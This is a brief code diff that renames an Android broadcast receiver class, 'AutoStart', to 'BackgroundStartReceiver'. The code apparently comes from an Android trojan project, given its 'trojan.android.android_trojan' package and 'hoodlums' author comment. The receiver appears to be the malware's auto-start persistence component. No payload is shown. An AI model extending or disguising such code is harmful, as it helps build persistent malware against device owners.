@@ -12,7 +12,7 @@ import trojan.android.android_trojan.Service.BackgroundService;
 /**
  * Created by hoodlums on 14/01/15.
  */
-public class AutoStart extends BroadcastReceiver {
+public class BackgroundStartReceiver extends BroadcastReceiver {
     private static final String TAG = "AutoStart";
 
     public void onReceive(Context context, Intent intent)
